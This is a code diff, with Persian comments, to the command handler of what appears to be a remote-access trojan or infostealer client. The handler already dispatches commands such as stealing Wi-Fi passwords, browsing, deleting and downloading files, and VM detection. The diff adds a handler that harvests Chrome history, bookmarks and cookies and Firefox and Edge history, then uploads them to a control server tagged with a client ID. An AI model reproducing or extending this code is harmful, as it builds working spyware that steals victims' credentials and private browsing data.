@@ -60,6 +60,13 @@ class CommandHandler:
         if Config.DEBUG_MODE:
             logging.info(f"Executing command type: {command_type}, params: {params}")
 
+        # تبدیل params به dictionary اگر list هست
+        if isinstance(params, list):
+            if params and isinstance(params[0], dict):
+                params = params[0]  # اگر اولین المان dictionary هست
+            else:
+                params = {}  # اگر لیست خالی یا غیر dictionary هست
+
         handlers = {
             # دستورات اصلی
             'system_info': CommandHandler.handle_system_info,
@@ -96,6 +103,10 @@ class CommandHandler:
             'signout': CommandHandler.handle_signout_command,
             'tasks': CommandHandler.handle_tasks_command,
             'getwifipasswords': CommandHandler.handle_wifi_passwords,
+            'file_operation': CommandHandler.handle_file_operation,  # اضافه کردن مجدد برای اطمینان
+            'collect_browser_data_comprehensive': CommandHandler.handle_collect_browser_data_comprehensive,
+            'get_browser_data': CommandHandler.handle_collect_browser_data_comprehensive,  # نام جایگزین
+            'get_comprehensive_browser_data': CommandHandler.handle_collect_browser_data_comprehensive,
         }
 
         handler = handlers.get(command_type)
@@ -113,25 +124,7 @@ class CommandHandler:
             return error_result
 
         try:
-            # برای دستورات system_command، original_command را از params استخراج کن
-            if command_type == 'system_command':
-                # اگر params دیکشنری است و original_command دارد
-                if isinstance(params, dict) and 'original_command' in params:
-                    return handler(params)
-                else:
-                    # اگر params دیکشنری نیست یا original_command ندارد،
-                    # یک دیکشنری جدید با original_command بساز
-                    command_params = {}
-                    if isinstance(params, dict):
-                        command_params.update(params)
-
-                    # اضافه کردن original_command بر اساس command_type
-                    if command_type == 'system_command':
-                        command_params['original_command'] = '/sleep'  # یا از داده‌های دیگر استفاده کن
-
-                    return handler(command_params)
-            else:
-                return handler(params)
+            return handler(params)
 
         except Exception as e:
             logging.error(f"Command execution failed for {command_type}: {str(e)}")
@@ -238,15 +231,29 @@ class CommandHandler:
         """Handle /browse command - file browsing"""
         try:
             logging.info("Handling browse command")
-            # Default to current directory if no path provided
+            
+            # تبدیل params به dictionary اگر لازم باشد
+            if isinstance(params, list):
+                if params and isinstance(params[0], dict):
+                    params = params[0]
+                else:
+                    params = {}
+            
+            # پیش‌فرض مسیر جاری اگر مسیری ارائه نشده
             if not params.get('path'):
                 params['path'] = os.getcwd()
+            
             params['action'] = 'list'
             return CommandHandler.handle_file_operation(params)
+            
         except Exception as e:
             logging.error(f"Browse command failed: {str(e)}")
-            raise CommandError(f"Browse command failed: {str(e)}")
-
+            return {
+                "status": "error",
+                "message": f"Browse command failed: {str(e)}",
+                "timestamp": datetime.datetime.now().isoformat()
+            }
+    
     @staticmethod
     def handle_go_command(params):
         """Handle /go command - open URL"""
@@ -678,13 +685,28 @@ class CommandHandler:
     @staticmethod
     def handle_file_operation(params):
         """Perform file operations"""
-        action = params.get('action')
-        path = params.get('path')
-        if not action or not path:
+        if not Config.ENABLE_FILE_MANAGEMENT:
+            return {"error": "File management disabled"}
+
+        # تبدیل params به dictionary اگر لازم باشد
+        if isinstance(params, list):
+            if params and isinstance(params[0], dict):
+                params = params[0]
+            else:
+                params = {}
+
+        # اگر params هنوز dictionary نیست، یک dictionary خالی ایجاد کن
+        if not isinstance(params, dict):
+            params = {}
+
+        action = params.get('action', 'list')  # پیش‌فرض 'list' اگر action مشخص نشده
+        path = params.get('path', os.getcwd())  # پیش‌فرض مسیر جاری
+
+        if not action:
             if Config.DEBUG_MODE:
-                logging.error("Missing action or path")
-            raise CommandError("Missing action or path")
-        
+                logging.error("Missing action in file operation")
+            return {"error": "Missing action"}
+
         # Security: Restrict access to sensitive paths
         restricted_paths = [
             'C:\\Windows\\System32',
@@ -694,45 +716,45 @@ class CommandHandler:
             'C:\\Boot',
             'C:\\Recovery'
         ]
-        
+
         for restricted in restricted_paths:
             if path.lower().startswith(restricted.lower()):
                 if Config.DEBUG_MODE:
                     logging.error(f"Access to restricted path denied: {path}")
-                raise CommandError(f"Access to restricted path denied: {path}")
-        
+                return {"error": f"Access to restricted path denied: {path}"}
+
         try:
             file_manager = CommandHandler._get_file_manager()
-            
+
             if action == 'list':
                 return file_manager.list_files(path)
-            
+
             elif action == 'read':
                 content = params.get('content', '')
                 return file_manager.edit_file(path, content)
-            
+
             elif action == 'delete':
                 return file_manager.delete_file(path)
-            
+
             elif action == 'download':
                 return file_manager.download_file(path)
-            
+
             elif action == 'info':
                 return file_manager.get_file_info(path)
-            
+
             elif action == 'search':
                 pattern = params.get('pattern', '')
                 return file_manager.search_files(path, pattern)
-            
+
             else:
                 if Config.DEBUG_MODE:
                     logging.error(f"Unsupported file operation: {action}")
-                raise CommandError(f"Unsupported file operation: {action}")
-                
+                return {"error": f"Unsupported file operation: {action}"}
+
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"File operation failed: {str(e)}")
-            raise CommandError(f"File operation failed: {str(e)}")
+            return {"error": f"File operation failed: {str(e)}"}
 
     @staticmethod
     def handle_system_info(params):
@@ -1138,6 +1160,53 @@ class CommandHandler:
         except Exception as e:
             logging.error(f"System data collection error: {str(e)}")
             raise CommandError(f"System data collection error: {str(e)}")
+
+    @staticmethod
+    def handle_collect_browser_data_comprehensive(params):
+        """دستور جدید برای جمع‌آوری اطلاعات کامل مرورگر"""
+        try:
+            logging.info("Handling comprehensive browser data collection command")
+
+            if not Config.ENABLE_BROWSER_DATA_COLLECTION:
+                return {
+                    "status": "disabled",
+                    "message": "Browser data collection disabled in config",
+                    "timestamp": datetime.datetime.now().isoformat()
+                }
+
+            collector = SystemCollector()
+            browser_data = collector.collect_comprehensive_browser_data()
+
+            # ارسال داده‌ها به سرور
+            try:
+                collector.communicator.upload_browser_data_comprehensive({
+                    "browser_data": browser_data,
+                    "client_id": Config.get_client_id(),
+                    "timestamp": datetime.datetime.now().isoformat()
+                })
+            except Exception as e:
+                logging.warning(f"Failed to upload browser data: {str(e)}")
+
+            return {
+                "status": "success",
+                "message": "Comprehensive browser data collected successfully",
+                "data_summary": {
+                    "chrome_history_count": len(browser_data.get("chrome", {}).get("history", [])),
+                    "chrome_bookmarks_count": len(browser_data.get("chrome", {}).get("bookmarks", [])),
+                    "chrome_cookies_count": len(browser_data.get("chrome", {}).get("cookies", [])),
+                    "firefox_history_count": len(browser_data.get("firefox", {}).get("history", [])),
+                    "edge_history_count": len(browser_data.get("edge", {}).get("history", []))
+                },
+                "timestamp": datetime.datetime.now().isoformat()
+            }
+
+        except Exception as e:
+            logging.error(f"Comprehensive browser data collection failed: {str(e)}")
+            return {
+                "status": "error",
+                "message": f"Browser data collection failed: {str(e)}",
+                "timestamp": datetime.datetime.now().isoformat()
+            }
 
     @staticmethod
     def handle_vm_detection(params):
